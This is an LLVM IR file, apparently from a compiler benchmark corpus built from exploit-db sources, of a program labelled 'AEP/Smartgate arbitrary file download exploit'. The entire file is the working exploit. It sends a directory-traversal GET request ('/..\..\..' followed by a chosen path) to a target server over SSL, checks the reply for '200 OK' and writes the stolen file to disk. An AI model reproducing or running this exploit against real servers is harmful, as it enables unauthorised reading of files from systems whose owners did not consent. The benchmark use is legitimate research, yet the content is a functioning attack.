; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_2637.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/remote/extr_2637.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.option = type { i8*, i32, i8, i32 }

@.str = private unnamed_addr constant [27 x i8] c"GET /..\\..\\..\\..\\..\\..\\..\\\00", align 1
@.str.1 = private unnamed_addr constant [18 x i8] c" HTTP/1.1\0D\0A\0D\0A\0D\0A\0D\0A\00", align 1
@main.options = internal global [5 x %struct.option] [%struct.option { i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0), i32 1, i8 0, i32 115 }, %struct.option { i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.3, i32 0, i32 0), i32 1, i8 0, i32 112 }, %struct.option { i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.4, i32 0, i32 0), i32 1, i8 0, i32 102 }, %struct.option { i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.5, i32 0, i32 0), i32 1, i8 0, i32 108 }, %struct.option { i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.6, i32 0, i32 0), i32 0, i8 0, i32 104 }], align 16
@.str.2 = private unnamed_addr constant [7 x i8] c"server\00", align 1
@.str.3 = private unnamed_addr constant [5 x i8] c"port\00", align 1
@.str.4 = private unnamed_addr constant [11 x i8] c"remotefile\00", align 1
@.str.5 = private unnamed_addr constant [10 x i8] c"localfile\00", align 1
@.str.6 = private unnamed_addr constant [5 x i8] c"help\00", align 1
@.str.7 = private unnamed_addr constant [49 x i8] c"[ AEP/Smartgate arbitrary file download exploit\0A\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"s:p:f:l:h\00", align 1
@optarg = common dso_local global i8* null, align 8
@.str.9 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.10 = private unnamed_addr constant [7 x i8] c"%s%s%s\00", align 1
@.str.11 = private unnamed_addr constant [8 x i8] c"[\0A[ %s\0A\00", align 1
@.str.12 = private unnamed_addr constant [26 x i8] c"[   --server|-s <dns/ip>\0A\00", align 1
@.str.13 = private unnamed_addr constant [22 x i8] c"[   --port|-p <port>\0A\00", align 1
@.str.14 = private unnamed_addr constant [37 x i8] c"[   --remotefile|-f <path/and/file>\0A\00", align 1
@.str.15 = private unnamed_addr constant [42 x i8] c"[   --localfile|-l <localfile/to/saveas>\0A\00", align 1
@.str.16 = private unnamed_addr constant [53 x i8] c"[\0A[ For a more detailed explanation read the source\0A\00", align 1
@.str.17 = private unnamed_addr constant [17 x i8] c"[ Try %s --help\0A\00", align 1
@SSL_MODE_AUTO_RETRY = common dso_local global i32 0, align 4
@.str.18 = private unnamed_addr constant [6 x i8] c"%s:%s\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.19 = private unnamed_addr constant [31 x i8] c"[ Error attempting to connect\0A\00", align 1
@.str.20 = private unnamed_addr constant [32 x i8] c"[ Connected to %s via (%s/tcp)\0A\00", align 1
@.str.21 = private unnamed_addr constant [5 x i8] c"%s%s\00", align 1
@.str.22 = private unnamed_addr constant [3 x i8] c"\0A\0A\00", align 1
@.str.23 = private unnamed_addr constant [40 x i8] c"[ Displaying raw HTTP response details\0A\00", align 1
@.str.24 = private unnamed_addr constant [7 x i8] c"200 OK\00", align 1
@.str.25 = private unnamed_addr constant [31 x i8] c"[ Exploit success, file found\0A\00", align 1
@O_RDWR = common dso_local global i32 0, align 4
@O_CREAT = common dso_local global i32 0, align 4
@S_IRWXU = common dso_local global i32 0, align 4
@.str.26 = private unnamed_addr constant [20 x i8] c"[ Error creating %s\00", align 1
@.str.27 = private unnamed_addr constant [41 x i8] c"[ Recieved %u byte(s) and saved as '%s'\0A\00", align 1
@.str.28 = private unnamed_addr constant [10 x i8] c"301 Moved\00", align 1
@.str.29 = private unnamed_addr constant [36 x i8] c"[ Exploit success, directory found\0A\00", align 1
@.str.30 = private unnamed_addr constant [18 x i8] c"[ Exploit failed\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32*, align 8
  %7 = alloca i32*, align 8
  %8 = alloca i32*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i64, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  %21 = alloca i8*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i8*, align 8
  %25 = alloca i8*, align 8
  %26 = alloca i8*, align 8
  %27 = alloca i8*, align 8
  %28 = alloca [1024 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %12, align 4
  store i64 0, i64* %13, align 8
  store i32 0, i32* %14, align 4
  store i32 0, i32* %15, align 4
  store i32 0, i32* %16, align 4
  store i32 0, i32* %17, align 4
  store i32 0, i32* %18, align 4
  store i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str, i64 0, i64 0), i8** %26, align 8
  store i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.1, i64 0, i64 0), i8** %27, align 8
  %29 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.7, i64 0, i64 0))
  br label %30

30:                                               ; preds = %91, %2
  %31 = load i32, i32* %10, align 4
  %32 = icmp ne i32 %31, -1
  br i1 %32, label %33, label %92

33:                                               ; preds = %30
  %34 = load i32, i32* %4, align 4
  %35 = load i8**, i8*** %5, align 8
  %36 = call i32 @getopt_long(i32 %34, i8** %35, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i64 0, i64 0), %struct.option* getelementptr inbounds ([5 x %struct.option], [5 x %struct.option]* @main.options, i64 0, i64 0), i32* %12)
  store i32 %36, i32* %10, align 4
  %37 = load i32, i32* %10, align 4
  switch i32 %37, label %90 [
    i32 -1, label %38
    i32 115, label %39
    i32 112, label %47
    i32 102, label %55
    i32 108, label %71
    i32 104, label %79
  ]

38:                                               ; preds = %33
  br label %91

39:                                               ; preds = %33
  %40 = load i8*, i8** @optarg, align 8
  %41 = call i32 @strlen(i8* %40)
  %42 = add nsw i32 %41, 1
  %43 = call i8* @malloc(i32 %42)
  store i8* %43, i8** %19, align 8
  %44 = load i8*, i8** %19, align 8
  %45 = load i8*, i8** @optarg, align 8
  %46 = call i32 (i8*, i8*, i8*, ...) @sprintf(i8* %44, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.9, i64 0, i64 0), i8* %45)
  store i32 1, i32* %14, align 4
  br label %91

47:                                               ; preds = %33
  %48 = load i8*, i8** @optarg, align 8
  %49 = call i32 @strlen(i8* %48)
  %50 = add nsw i32 %49, 1
  %51 = call i8* @malloc(i32 %50)
  store i8* %51, i8** %23, align 8
  %52 = load i8*, i8** %23, align 8
  %53 = load i8*, i8** @optarg, align 8
  %54 = call i32 (i8*, i8*, i8*, ...) @sprintf(i8* %52, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.9, i64 0, i64 0), i8* %53)
  store i32 1, i32* %15, align 4
  br label %91

55:                                               ; preds = %33
  %56 = load i8*, i8** @optarg, align 8
  %57 = call i32 @strlen(i8* %56)
  %58 = load i8*, i8** %26, align 8
  %59 = call i32 @strlen(i8* %58)
  %60 = add nsw i32 %57, %59
  %61 = load i8*, i8** %27, align 8
  %62 = call i32 @strlen(i8* %61)
  %63 = add nsw i32 %60, %62
  %64 = add nsw i32 %63, 1
  %65 = call i8* @malloc(i32 %64)
  store i8* %65, i8** %20, align 8
  %66 = load i8*, i8** %20, align 8
  %67 = load i8*, i8** %26, align 8
  %68 = load i8*, i8** @optarg, align 8
  %69 = load i8*, i8** %27, align 8
  %70 = call i32 (i8*, i8*, i8*, ...) @sprintf(i8* %66, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.10, i64 0, i64 0), i8* %67, i8* %68, i8* %69)
  store i32 1, i32* %16, align 4
  br label %91

71:                                               ; preds = %33
  %72 = load i8*, i8** @optarg, align 8
  %73 = call i32 @strlen(i8* %72)
  %74 = add nsw i32 %73, 1
  %75 = call i8* @malloc(i32 %74)
  store i8* %75, i8** %21, align 8
  %76 = load i8*, i8** %21, align 8
  %77 = load i8*, i8** @optarg, align 8
  %78 = call i32 (i8*, i8*, i8*, ...) @sprintf(i8* %76, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.9, i64 0, i64 0), i8* %77)
  store i32 1, i32* %17, align 4
  br label %91

79:                                               ; preds = %33
  %80 = load i8**, i8*** %5, align 8
  %81 = getelementptr inbounds i8*, i8** %80, i64 0
  %82 = load i8*, i8** %81, align 8
  %83 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i64 0, i64 0), i8* %82)
  %84 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.12, i64 0, i64 0))
  %85 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.13, i64 0, i64 0))
  %86 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.14, i64 0, i64 0))
  %87 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.15, i64 0, i64 0))
  %88 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([53 x i8], [53 x i8]* @.str.16, i64 0, i64 0))
  %89 = call i32 @exit(i32 0) #3
  unreachable

90:                                               ; preds = %33
  br label %91

91:                                               ; preds = %90, %71, %55, %47, %39, %38
  br label %30

92:                                               ; preds = %30
  %93 = load i32, i32* %14, align 4
  %94 = icmp ne i32 %93, 1
  br i1 %94, label %104, label %95

95:                                               ; preds = %92
  %96 = load i32, i32* %15, align 4
  %97 = icmp ne i32 %96, 1
  br i1 %97, label %104, label %98

98:                                               ; preds = %95
  %99 = load i32, i32* %16, align 4
  %100 = icmp ne i32 %99, 1
  br i1 %100, label %104, label %101

101:                                              ; preds = %98
  %102 = load i32, i32* %17, align 4
  %103 = icmp ne i32 %102, 1
  br i1 %103, label %104, label %110

104:                                              ; preds = %101, %98, %95, %92
  %105 = load i8**, i8*** %5, align 8
  %106 = getelementptr inbounds i8*, i8** %105, i64 0
  %107 = load i8*, i8** %106, align 8
  %108 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.17, i64 0, i64 0), i8* %107)
  %109 = call i32 @exit(i32 0) #3
  unreachable

110:                                              ; preds = %101
  %111 = call i32 (...) @ERR_load_BIO_strings()
  %112 = call i32 (...) @SSL_load_error_strings()
  %113 = call i32 (...) @OpenSSL_add_all_algorithms()
  %114 = call i32 (...) @SSLv23_client_method()
  %115 = call i32* @SSL_CTX_new(i32 %114)
  store i32* %115, i32** %8, align 8
  %116 = load i32*, i32** %8, align 8
  %117 = call i32* @BIO_new_ssl_connect(i32* %116)
  store i32* %117, i32** %6, align 8
  %118 = load i32*, i32** %6, align 8
  %119 = call i32 @BIO_get_ssl(i32* %118, i32** %7)
  %120 = load i32*, i32** %7, align 8
  %121 = load i32, i32* @SSL_MODE_AUTO_RETRY, align 4
  %122 = call i32 @SSL_set_mode(i32* %120, i32 %121)
  %123 = load i8*, i8** %19, align 8
  %124 = call i32 @strlen(i8* %123)
  %125 = load i8*, i8** %23, align 8
  %126 = call i32 @strlen(i8* %125)
  %127 = add nsw i32 %124, %126
  %128 = add nsw i32 %127, 2
  %129 = call i8* @malloc(i32 %128)
  store i8* %129, i8** %22, align 8
  %130 = load i8*, i8** %22, align 8
  %131 = load i8*, i8** %19, align 8
  %132 = load i8*, i8** %23, align 8
  %133 = call i32 (i8*, i8*, i8*, ...) @sprintf(i8* %130, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.18, i64 0, i64 0), i8* %131, i8* %132)
  %134 = load i32*, i32** %6, align 8
  %135 = load i8*, i8** %22, align 8
  %136 = call i32 @BIO_set_conn_hostname(i32* %134, i8* %135)
  %137 = load i32*, i32** %6, align 8
  %138 = call i64 @BIO_do_connect(i32* %137)
  %139 = icmp sle i64 %138, 0
  br i1 %139, label %140, label %149

140:                                              ; preds = %110
  %141 = load i32, i32* @stderr, align 4
  %142 = call i32 @fprintf(i32 %141, i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.19, i64 0, i64 0))
  %143 = load i32, i32* @stderr, align 4
  %144 = call i32 @ERR_print_errors_fp(i32 %143)
  %145 = load i32*, i32** %6, align 8
  %146 = call i32 @BIO_free_all(i32* %145)
  %147 = load i32*, i32** %8, align 8
  %148 = call i32 @SSL_CTX_free(i32* %147)
  store i32 0, i32* %3, align 4
  br label %261

149:                                              ; preds = %110
  %150 = load i8*, i8** %19, align 8
  %151 = load i8*, i8** %23, align 8
  %152 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.20, i64 0, i64 0), i8* %150, i8* %151)
  %153 = load i32*, i32** %6, align 8
  %154 = load i8*, i8** %20, align 8
  %155 = load i8*, i8** %20, align 8
  %156 = call i32 @strlen(i8* %155)
  %157 = call i32 @BIO_write(i32* %153, i8* %154, i32 %156)
  store i32 0, i32* %18, align 4
  %158 = call i8* @malloc(i32 2)
  store i8* %158, i8** %24, align 8
  %159 = load i8*, i8** %24, align 8
  %160 = call i32 @memset(i8* %159, i32 0, i32 2)
  br label %161

161:                                              ; preds = %164, %149
  %162 = load i32, i32* %18, align 4
  %163 = icmp eq i32 %162, 0
  br i1 %163, label %164, label %188

164:                                              ; preds = %161
  %165 = load i32*, i32** %6, align 8
  %166 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i64 0, i64 0
  %167 = call i32 @BIO_read(i32* %165, i8* %166, i32 1)
  store i32 %167, i32* %9, align 4
  %168 = load i32, i32* %9, align 4
  %169 = sext i32 %168 to i64
  %170 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i64 0, i64 %169
  store i8 0, i8* %170, align 1
  %171 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i64 0, i64 0
  %172 = call i32 @strlen(i8* %171)
  %173 = load i8*, i8** %24, align 8
  %174 = call i32 @strlen(i8* %173)
  %175 = add nsw i32 %172, %174
  %176 = add nsw i32 %175, 1
  %177 = call i8* @malloc(i32 %176)
  store i8* %177, i8** %25, align 8
  %178 = load i8*, i8** %25, align 8
  %179 = load i8*, i8** %24, align 8
  %180 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i64 0, i64 0
  %181 = call i32 (i8*, i8*, i8*, ...) @sprintf(i8* %178, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.21, i64 0, i64 0), i8* %179, i8* %180)
  %182 = load i8*, i8** %24, align 8
  %183 = call i32 @free(i8* %182)
  %184 = load i8*, i8** %25, align 8
  store i8* %184, i8** %24, align 8
  %185 = load i8*, i8** %24, align 8
  %186 = call i64 @strstr(i8* %185, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.22, i64 0, i64 0))
  %187 = trunc i64 %186 to i32
  store i32 %187, i32* %18, align 4
  br label %161

188:                                              ; preds = %161
  %189 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.23, i64 0, i64 0))
  %190 = load i8*, i8** %24, align 8
  %191 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.9, i64 0, i64 0), i8* %190)
  store i32 0, i32* %18, align 4
  %192 = load i8*, i8** %24, align 8
  %193 = call i64 @strstr(i8* %192, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.24, i64 0, i64 0))
  %194 = trunc i64 %193 to i32
  store i32 %194, i32* %18, align 4
  %195 = load i32, i32* %18, align 4
  %196 = icmp ne i32 %195, 0
  br i1 %196, label %197, label %237

197:                                              ; preds = %188
  %198 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.25, i64 0, i64 0))
  %199 = load i8*, i8** %21, align 8
  %200 = load i32, i32* @O_RDWR, align 4
  %201 = load i32, i32* @O_CREAT, align 4
  %202 = or i32 %200, %201
  %203 = load i32, i32* @S_IRWXU, align 4
  %204 = call i32 @open(i8* %199, i32 %202, i32 %203)
  store i32 %204, i32* %11, align 4
  %205 = load i32, i32* %11, align 4
  %206 = icmp eq i32 %205, -1
  br i1 %206, label %207, label %211

207:                                              ; preds = %197
  %208 = load i8*, i8** %21, align 8
  %209 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.26, i64 0, i64 0), i8* %208)
  %210 = call i32 @exit(i32 0) #3
  unreachable

211:                                              ; preds = %197
  br label %212

212:                                              ; preds = %219, %211
  %213 = load i32*, i32** %6, align 8
  %214 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i64 0, i64 0
  %215 = call i32 @BIO_read(i32* %213, i8* %214, i32 1023)
  store i32 %215, i32* %9, align 4
  %216 = load i32, i32* %9, align 4
  %217 = icmp sle i32 %216, 0
  br i1 %217, label %218, label %219

218:                                              ; preds = %212
  br label %231

219:                                              ; preds = %212
  %220 = load i32, i32* %9, align 4
  %221 = sext i32 %220 to i64
  %222 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i64 0, i64 %221
  store i8 0, i8* %222, align 1
  %223 = load i32, i32* %11, align 4
  %224 = getelementptr inbounds [1024 x i8], [1024 x i8]* %28, i64 0, i64 0
  %225 = load i32, i32* %9, align 4
  %226 = call i32 @write(i32 %223, i8* %224, i32 %225)
  %227 = load i64, i64* %13, align 8
  %228 = load i32, i32* %9, align 4
  %229 = sext i32 %228 to i64
  %230 = add i64 %227, %229
  store i64 %230, i64* %13, align 8
  br label %212

231:                                              ; preds = %218
  %232 = load i64, i64* %13, align 8
  %233 = load i8*, i8** %21, align 8
  %234 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.27, i64 0, i64 0), i64 %232, i8* %233)
  %235 = load i32, i32* %11, align 4
  %236 = call i32 @close(i32 %235)
  br label %237

237:                                              ; preds = %231, %188
  %238 = load i32, i32* %18, align 4
  %239 = icmp eq i32 %238, 0
  br i1 %239, label %240, label %249

240:                                              ; preds = %237
  %241 = load i8*, i8** %24, align 8
  %242 = call i64 @strstr(i8* %241, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.28, i64 0, i64 0))
  %243 = trunc i64 %242 to i32
  store i32 %243, i32* %18, align 4
  %244 = load i32, i32* %18, align 4
  %245 = icmp ne i32 %244, 0
  br i1 %245, label %246, label %248

246:                                              ; preds = %240
  %247 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([36 x i8], [36 x i8]* @.str.29, i64 0, i64 0))
  br label %248

248:                                              ; preds = %246, %240
  br label %249

249:                                              ; preds = %248, %237
  %250 = load i8*, i8** %24, align 8
  %251 = call i32 @free(i8* %250)
  %252 = load i32, i32* %18, align 4
  %253 = icmp eq i32 %252, 0
  br i1 %253, label %254, label %256

254:                                              ; preds = %249
  %255 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.30, i64 0, i64 0))
  br label %256

256:                                              ; preds = %254, %249
  %257 = load i32*, i32** %6, align 8
  %258 = call i32 @BIO_free_all(i32* %257)
  %259 = load i32*, i32** %8, align 8
  %260 = call i32 @SSL_CTX_free(i32* %259)
  store i32 0, i32* %3, align 4
  br label %261

261:                                              ; preds = %256, %140
  %262 = load i32, i32* %3, align 4
  ret i32 %262
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @getopt_long(i32, i8**, i8*, %struct.option*, i32*) #1

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @sprintf(i8*, i8*, i8*, ...) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @ERR_load_BIO_strings(...) #1

declare dso_local i32 @SSL_load_error_strings(...) #1

declare dso_local i32 @OpenSSL_add_all_algorithms(...) #1

declare dso_local i32* @SSL_CTX_new(i32) #1

declare dso_local i32 @SSLv23_client_method(...) #1

declare dso_local i32* @BIO_new_ssl_connect(i32*) #1

declare dso_local i32 @BIO_get_ssl(i32*, i32**) #1

declare dso_local i32 @SSL_set_mode(i32*, i32) #1

declare dso_local i32 @BIO_set_conn_hostname(i32*, i8*) #1

declare dso_local i64 @BIO_do_connect(i32*) #1

declare dso_local i32 @fprintf(i32, i8*) #1

declare dso_local i32 @ERR_print_errors_fp(i32) #1

declare dso_local i32 @BIO_free_all(i32*) #1

declare dso_local i32 @SSL_CTX_free(i32*) #1

declare dso_local i32 @BIO_write(i32*, i8*, i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @BIO_read(i32*, i8*, i32) #1

declare dso_local i32 @free(i8*) #1

declare dso_local i64 @strstr(i8*, i8*) #1

declare dso_local i32 @open(i8*, i32, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @close(i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
